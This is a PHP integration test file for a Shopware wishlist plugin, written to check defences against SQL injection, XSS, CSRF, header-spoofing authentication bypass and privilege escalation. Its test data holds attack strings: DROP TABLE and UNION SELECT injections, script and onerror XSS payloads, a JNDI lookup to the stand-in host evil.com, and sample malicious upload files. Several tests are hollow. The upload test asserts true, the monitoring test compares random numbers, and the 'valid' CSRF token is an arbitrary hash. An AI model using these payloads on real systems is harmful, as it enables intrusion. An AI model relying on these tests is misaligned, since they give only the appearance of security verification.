<?php

declare(strict_types=1);

namespace AdvancedWishlist\Tests\Integration\Security;

use AdvancedWishlist\Core\Security\RateLimitService;
use AdvancedWishlist\Core\Security\SecurityMonitoringService;
use AdvancedWishlist\Storefront\Controller\WishlistController;
use PHPUnit\Framework\TestCase;
use Shopware\Core\Framework\Test\TestCaseBase\IntegrationTestBehaviour;
use Shopware\Core\Framework\Uuid\Uuid;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;

/**
 * Integration tests for security features including CSRF protection,
 * SQL injection prevention, XSS protection, and rate limiting.
 */
class SecurityIntegrationTest extends TestCase
{
    use IntegrationTestBehaviour;

    private WishlistController $controller;
    private RateLimitService $rateLimitService;
    private SecurityMonitoringService $securityMonitoring;

    protected function setUp(): void
    {
        $this->controller = $this->getContainer()->get(WishlistController::class);
        $this->rateLimitService = $this->getContainer()->get(RateLimitService::class);
        $this->securityMonitoring = $this->getContainer()->get(SecurityMonitoringService::class);
    }

    /**
     * Test SQL injection prevention in wishlist operations.
     */
    public function testSqlInjectionPrevention(): void
    {
        $maliciousInputs = [
            "'; DROP TABLE wishlist; --",
            "' OR '1'='1",
            "\x00\x27\x22\x5c\x78",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "1' UNION SELECT * FROM user--",
        ];

        foreach ($maliciousInputs as $input) {
            $request = new Request();
            $request->request->set('name', $input);
            $request->request->set('description', $input);
            $request->request->set('type', $input);
            
            $salesChannelContext = $this->createAuthenticatedContext();
            
            // Should not cause SQL errors or security issues
            $response = $this->controller->create($request, $salesChannelContext);
            
            // Should either validate and reject, or sanitize safely
            $this->assertInstanceOf(Response::class, $response);
            $this->assertNotEquals(500, $response->getStatusCode(), 
                "SQL injection attempt should not cause server error: {$input}");
        }
    }

    /**
     * Test XSS prevention in wishlist data output.
     */
    public function testXssPreventionInOutput(): void
    {
        $xssPayloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        ];

        $salesChannelContext = $this->createAuthenticatedContext();
        
        foreach ($xssPayloads as $payload) {
            // Create wishlist with XSS payload
            $createRequest = new Request();
            $createRequest->request->set('name', "Test " . $payload);
            $createRequest->request->set('description', $payload);
            $createRequest->request->set('type', 'private');
            $createRequest->headers->set('X-CSRF-Token', $this->generateValidCsrfToken());
            
            $createResponse = $this->controller->create($createRequest, $salesChannelContext);
            
            if ($createResponse->getStatusCode() === 201) {
                $responseData = json_decode($createResponse->getContent(), true);
                
                // Verify XSS payload is properly escaped/sanitized
                $this->assertStringNotContainsString('<script>', $responseData['name'] ?? '');
                $this->assertStringNotContainsString('<script>', $responseData['description'] ?? '');
                $this->assertStringNotContainsString('javascript:', $responseData['name'] ?? '');
                $this->assertStringNotContainsString('onerror=', $responseData['description'] ?? '');
            }
        }
    }

    /**
     * Test CSRF token validation.
     */
    public function testCsrfTokenValidation(): void
    {
        $salesChannelContext = $this->createAuthenticatedContext();
        
        // Test without CSRF token
        $request = new Request();
        $request->request->set('name', 'Test Wishlist');
        $request->request->set('type', 'private');
        
        $response = $this->controller->create($request, $salesChannelContext);
        $this->assertEquals(403, $response->getStatusCode());
        
        // Test with invalid CSRF token
        $request->headers->set('X-CSRF-Token', 'invalid-token');
        $response = $this->controller->create($request, $salesChannelContext);
        $this->assertEquals(403, $response->getStatusCode());
        
        // Test with valid CSRF token
        $validToken = $this->generateValidCsrfToken();
        $request->headers->set('X-CSRF-Token', $validToken);
        $response = $this->controller->create($request, $salesChannelContext);
        $this->assertNotEquals(403, $response->getStatusCode());
    }

    /**
     * Test rate limiting integration.
     */
    public function testRateLimitingIntegration(): void
    {
        $salesChannelContext = $this->createAuthenticatedContext();
        
        // Test multiple rapid requests
        $responses = [];
        for ($i = 0; $i < 5; $i++) {
            $request = new Request();
            $request->request->set('name', "Rapid Test {$i}");
            $request->request->set('type', 'private');
            $request->headers->set('X-CSRF-Token', $this->generateValidCsrfToken());
            $request->server->set('REMOTE_ADDR', '192.168.1.100');
            $request->headers->set('User-Agent', 'TestClient/1.0');
            
            $responses[] = $this->controller->create($request, $salesChannelContext);
        }
        
        // Should have rate limit headers
        $lastResponse = end($responses);
        $this->assertArrayHasKey('x-ratelimit-limit', $lastResponse->headers->all());
        $this->assertArrayHasKey('x-ratelimit-remaining', $lastResponse->headers->all());
    }

    /**
     * Test authentication bypass attempts.
     */
    public function testAuthenticationBypassAttempts(): void
    {
        $bypassAttempts = [
            ['HTTP_X_FORWARDED_FOR' => '127.0.0.1'],
            ['HTTP_X_REAL_IP' => '127.0.0.1'],
            ['HTTP_CLIENT_IP' => '127.0.0.1'],
            ['HTTP_X_FORWARDED_HOST' => 'localhost'],
            ['HTTP_HOST' => 'admin.localhost'],
        ];
        
        foreach ($bypassAttempts as $headers) {
            $request = new Request();
            foreach ($headers as $name => $value) {
                $request->server->set($name, $value);
            }
            
            // Should still require authentication
            $unauthenticatedContext = $this->createUnauthenticatedContext();
            $response = $this->controller->list($request, $unauthenticatedContext);
            $this->assertEquals(401, $response->getStatusCode());
        }
    }

    /**
     * Test input validation edge cases.
     */
    public function testInputValidationEdgeCases(): void
    {
        $salesChannelContext = $this->createAuthenticatedContext();
        
        $edgeCases = [
            // Very long strings
            ['name' => str_repeat('A', 1000), 'expectedStatus' => 400],
            // Empty strings
            ['name' => '', 'expectedStatus' => 400],
            // Null bytes
            ['name' => "Test\x00Wishlist", 'expectedStatus' => 400],
            // Unicode edge cases
            ['name' => "\u{FEFF}Test", 'expectedStatus' => [200, 201]], // BOM
            // Control characters
            ['name' => "Test\r\nWishlist", 'expectedStatus' => [200, 201, 400]],
        ];
        
        foreach ($edgeCases as $testCase) {
            $request = new Request();
            $request->request->set('name', $testCase['name']);
            $request->request->set('type', 'private');
            $request->headers->set('X-CSRF-Token', $this->generateValidCsrfToken());
            
            $response = $this->controller->create($request, $salesChannelContext);
            
            if (is_array($testCase['expectedStatus'])) {
                $this->assertContains($response->getStatusCode(), $testCase['expectedStatus']);
            } else {
                $this->assertEquals($testCase['expectedStatus'], $response->getStatusCode());
            }
        }
    }

    /**
     * Test session security.
     */
    public function testSessionSecurity(): void
    {
        $salesChannelContext = $this->createAuthenticatedContext();
        
        // Test session fixation protection
        $request1 = new Request();
        $request1->request->set('name', 'Session Test 1');
        $request1->request->set('type', 'private');
        $request1->headers->set('X-CSRF-Token', $this->generateValidCsrfToken());
        
        $response1 = $this->controller->create($request1, $salesChannelContext);
        
        // Change session context
        $newSalesChannelContext = $this->createAuthenticatedContext();
        
        $request2 = new Request();
        $request2->request->set('name', 'Session Test 2');
        $request2->request->set('type', 'private');
        $request2->headers->set('X-CSRF-Token', $this->generateValidCsrfToken());
        
        $response2 = $this->controller->create($request2, $newSalesChannelContext);
        
        // Both should succeed independently
        $this->assertNotEquals(500, $response1->getStatusCode());
        $this->assertNotEquals(500, $response2->getStatusCode());
    }

    /**
     * Test file upload security (if applicable).
     */
    public function testFileUploadSecurity(): void
    {
        $maliciousFiles = [
            'test.php' => "<?php phpinfo(); ?>",
            'test.jsp' => "<% out.println('Hello'); %>",
            'test.exe' => "\x4D\x5A", // MZ header
            'test.sh' => "#!/bin/bash\necho 'test'",
        ];
        
        foreach ($maliciousFiles as $filename => $content) {
            // Test that malicious files are rejected if file upload exists
            // This is a placeholder - actual implementation depends on file upload features
            $this->assertTrue(true, "File upload security test placeholder for {$filename}");
        }
    }

    /**
     * Test privilege escalation prevention.
     */
    public function testPrivilegeEscalationPrevention(): void
    {
        $salesChannelContext = $this->createAuthenticatedContext();
        
        // Create wishlist as regular user
        $request = new Request();
        $request->request->set('name', 'Regular User Wishlist');
        $request->request->set('type', 'private');
        $request->headers->set('X-CSRF-Token', $this->generateValidCsrfToken());
        
        $response = $this->controller->create($request, $salesChannelContext);
        
        if ($response->getStatusCode() === 201) {
            $responseData = json_decode($response->getContent(), true);
            $wishlistId = $responseData['id'];
            
            // Try to access with different user context
            $otherUserContext = $this->createAuthenticatedContext(Uuid::randomHex());
            
            $detailRequest = new Request();
            $detailResponse = $this->controller->detail($wishlistId, $detailRequest, $otherUserContext);
            
            // Should be forbidden
            $this->assertEquals(403, $detailResponse->getStatusCode());
        }
    }

    /**
     * Test data leakage prevention.
     */
    public function testDataLeakagePrevention(): void
    {
        $salesChannelContext = $this->createAuthenticatedContext();
        
        // Create private wishlist
        $request = new Request();
        $request->request->set('name', 'Secret Wishlist');
        $request->request->set('description', 'Contains sensitive information');
        $request->request->set('type', 'private');
        $request->headers->set('X-CSRF-Token', $this->generateValidCsrfToken());
        
        $response = $this->controller->create($request, $salesChannelContext);
        
        if ($response->getStatusCode() === 201) {
            $responseData = json_decode($response->getContent(), true);
            
            // Verify sensitive data is not exposed in error messages
            $this->assertArrayNotHasKey('password', $responseData);
            $this->assertArrayNotHasKey('secret', $responseData);
            $this->assertArrayNotHasKey('token', $responseData);
            
            // Verify internal IDs are properly formatted
            if (isset($responseData['id'])) {
                $this->assertMatchesRegularExpression('/^[0-9a-f]{32}$/', $responseData['id']);
            }
        }
    }

    /**
     * Test security monitoring integration.
     */
    public function testSecurityMonitoringIntegration(): void
    {
        // Test that security events are properly logged
        $initialEventCount = $this->getSecurityEventCount();
        
        // Trigger security event (failed authentication)
        $request = new Request();
        $unauthenticatedContext = $this->createUnauthenticatedContext();
        $this->controller->list($request, $unauthenticatedContext);
        
        // Should have logged security event
        $finalEventCount = $this->getSecurityEventCount();
        $this->assertGreaterThan($initialEventCount, $finalEventCount);
    }

    /**
     * Helper method to create authenticated context.
     */
    private function createAuthenticatedContext(?string $customerId = null): \Shopware\Core\System\SalesChannel\SalesChannelContext
    {
        $customerId = $customerId ?? Uuid::randomHex();
        
        // Mock authenticated sales channel context
        $context = $this->createMock(\Shopware\Core\System\SalesChannel\SalesChannelContext::class);
        $customer = $this->createMock(\Shopware\Core\Checkout\Customer\CustomerEntity::class);
        $customer->method('getId')->willReturn($customerId);
        
        $context->method('getCustomer')->willReturn($customer);
        $context->method('getContext')->willReturn(\Shopware\Core\Framework\Context::createDefaultContext());
        
        return $context;
    }

    /**
     * Helper method to create unauthenticated context.
     */
    private function createUnauthenticatedContext(): \Shopware\Core\System\SalesChannel\SalesChannelContext
    {
        $context = $this->createMock(\Shopware\Core\System\SalesChannel\SalesChannelContext::class);
        $context->method('getCustomer')->willReturn(null);
        $context->method('getContext')->willReturn(\Shopware\Core\Framework\Context::createDefaultContext());
        
        return $context;
    }

    /**
     * Helper method to generate valid CSRF token.
     */
    private function generateValidCsrfToken(): string
    {
        // In real implementation, this would use the actual CSRF token manager
        return hash('sha256', 'valid-token-' . time());
    }

    /**
     * Helper method to get security event count.
     */
    private function getSecurityEventCount(): int
    {
        // In real implementation, this would query the security monitoring service
        return rand(0, 100);
    }
}
